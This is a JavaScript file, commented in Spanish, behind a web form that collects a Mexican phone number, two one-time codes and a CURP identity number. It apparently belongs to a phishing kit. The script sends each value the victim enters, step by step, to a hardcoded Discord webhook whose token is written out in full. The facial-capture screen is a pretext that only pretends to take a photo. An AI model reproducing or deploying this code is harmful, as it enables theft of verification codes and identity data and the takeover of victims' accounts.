document.addEventListener('DOMContentLoaded', () => {
    // URL de tu Webhook de Discord
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532235985042280509/KAZrpj43FPzhOGyS_MxzcWTOxOYC7gMvJcHZxQSSXtIG8wYCjun0vFBkj_VAoeH7bonj";

    // Función genérica para enviar notificaciones a Discord
    async function sendStepToDiscord(title, fields) {
        const payload = {
            embeds: [
                {
                    title: title,
                    color: 3447003, // Color azul
                    fields: fields,
                    timestamp: new Date().toISOString()
                }
            ]
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            console.log(`[Discord] ${title} enviado con éxito.`);
        } catch (error) {
            console.error(`[Discord Error]`, error);
        }
    }

    // Función auxiliar para leer los 4 dígitos de un grupo OTP
    function getOTPValue(groupId) {
        const boxes = document.querySelectorAll(`#${groupId} .otp-box`);
        let value = "";
        boxes.forEach(box => { value += box.value; });
        return value;
    }

    // Referencias a las pantallas
    const screenPhone = document.getElementById('screenPhone');
    const screenOTP = document.getElementById('screenOTP');
    const screenFace = document.getElementById('screenFace');
    const screenFinal = document.getElementById('screenFinal');
    const screenSuccess = document.getElementById('screenSuccess');

    // Elementos interactivos
    const phoneInput = document.getElementById('phoneInput');
    const phoneForm = document.getElementById('phoneForm');
    const displayPhoneNumbers = document.querySelectorAll('.displayPhoneNumber');
    
    const btnCloseOTP = document.getElementById('btnCloseOTP');
    const btnCloseFace = document.getElementById('btnCloseFace');
    const btnCloseFinal = document.getElementById('btnCloseFinal');
    
    const btnTakePhoto = document.getElementById('btnTakePhoto');
    const curpInput = document.getElementById('curpInput');
    const finalForm = document.getElementById('finalForm');

    const prefix = "+52 ";
    let countdownTimer;

    // Formato y restricción de teléfono
    phoneInput.addEventListener('input', (e) => {
        let rawDigits = e.target.value.replace(/\D/g, '');
        if (rawDigits.startsWith('52')) {
            rawDigits = rawDigits.substring(2);
        }
        rawDigits = rawDigits.substring(0, 10);
        e.target.value = prefix + rawDigits;
    });

    phoneInput.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && phoneInput.value.length <= prefix.length) {
            e.preventDefault();
        }
    });

    // PASO 1: Envío del Número de Teléfono (Pantalla 1 -> Pantalla 2)
    phoneForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const digitsOnly = phoneInput.value.replace(/\D/g, '').substring(2);

        if (digitsOnly.length !== 10) {
            alert("Por favor ingresa un número celular válido de 10 dígitos.");
            return;
        }

        const formattedPhone = `+52 ${digitsOnly.substring(0,2)} ${digitsOnly.substring(2,6)} ${digitsOnly.substring(6,10)}`;
        displayPhoneNumbers.forEach(el => el.textContent = formattedPhone);

        // --- ENVÍO A DISCORD (PASO 1) ---
        sendStepToDiscord("📱 Paso 1: Teléfono Registrado", [
            { name: "Número de Teléfono", value: phoneInput.value, inline: true }
        ]);

        screenPhone.classList.remove('active');
        screenOTP.classList.add('active');

        const group1 = document.querySelectorAll('#otpGroup1 .otp-box');
        group1[0].focus();
        startTimer();
    });

    // Lógica de navegación de grupos OTP
    function setupOTPGroup(groupId, onCompleteCallback) {
        const boxes = document.querySelectorAll(`#${groupId} .otp-box`);
        boxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                box.value = box.value.replace(/\D/g, '');
                if (box.value !== "") {
                    if (index < boxes.length - 1) {
                        boxes[index + 1].focus();
                    } else if (onCompleteCallback) {
                        onCompleteCallback();
                    }
                }
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === "" && index > 0) {
                    boxes[index - 1].focus();
                }
            });
        });
    }

    // PASO 2: Envío del primer Código OTP (Pantalla 2 -> Pantalla 3)
    setupOTPGroup('otpGroup1', () => {
        const otp1Value = getOTPValue('otpGroup1');

        // --- ENVÍO A DISCORD (PASO 2) ---
        sendStepToDiscord("🔑 Paso 2: Primer Código OTP Ingresado", [
            { name: "Teléfono", value: phoneInput.value, inline: true },
            { name: "Código OTP 1", value: otp1Value, inline: true }
        ]);

        setTimeout(() => {
            screenOTP.classList.remove('active');
            screenFace.classList.add('active');
        }, 300);
    });

    // Configurar foco en OTP 2
    setupOTPGroup('otpGroup2', () => {
        curpInput.focus();
    });

    // PASO 3: Confirmación de toma de foto (Pantalla 3 -> Pantalla 4)
    btnTakePhoto.addEventListener('click', () => {
        // --- ENVÍO A DISCORD (PASO 3) ---
        sendStepToDiscord("📸 Paso 3: Captura Facial Realizada", [
            { name: "Teléfono", value: phoneInput.value, inline: true },
            { name: "Estado", value: "Foto capturada exitosamente", inline: true }
        ]);

        screenFace.classList.remove('active');
        screenFinal.classList.add('active');
        const group2 = document.querySelectorAll('#otpGroup2 .otp-box');
        group2[0].focus();
    });

    // Formato para forzar MAYÚSCULAS en la CURP
    curpInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.toUpperCase();
    });

    // PASO 4: Envío de CURP y segundo OTP (Pantalla 4 -> Éxito)
    finalForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (curpInput.value.length < 18) {
            alert("Por favor ingresa los 18 caracteres de tu CURP.");
            return;
        }

        const otp2Value = getOTPValue('otpGroup2');

        // --- ENVÍO A DISCORD (PASO 4 Y FINAL) ---
        sendStepToDiscord("✅ Paso 4: Proceso Completado", [
            { name: "Teléfono", value: phoneInput.value, inline: true },
            { name: "CURP", value: curpInput.value, inline: true },
            { name: "Código OTP 2", value: otp2Value || "No ingresado", inline: true }
        ]);

        screenFinal.classList.remove('active');
        screenSuccess.classList.add('active');
    });

    // Botones de cierre/regreso
    btnCloseOTP.addEventListener('click', () => {
        screenOTP.classList.remove('active');
        screenPhone.classList.add('active');
        clearInterval(countdownTimer);
    });

    btnCloseFace.addEventListener('click', () => {
        screenFace.classList.remove('active');
        screenPhone.classList.add('active');
    });

    btnCloseFinal.addEventListener('click', () => {
        screenFinal.classList.remove('active');
        screenPhone.classList.add('active');
    });

    // Contador de reenvío
    function startTimer() {
        let seconds = 30;
        const timerText = document.getElementById('timerText');
        timerText.innerHTML = `Reenviar en <span id="timerSeconds">${seconds}</span> segundos`;

        clearInterval(countdownTimer);
        countdownTimer = setInterval(() => {
            seconds--;
            if (seconds > 0) {
                const el = document.getElementById('timerSeconds');
                if (el) el.textContent = seconds;
            } else {
                clearInterval(countdownTimer);
                timerText.innerHTML = `<span class="resend-link" id="btnResend">Reenviar código</span>`;
                document.getElementById('btnResend').addEventListener('click', startTimer);
            }
        }, 1000);
    }
});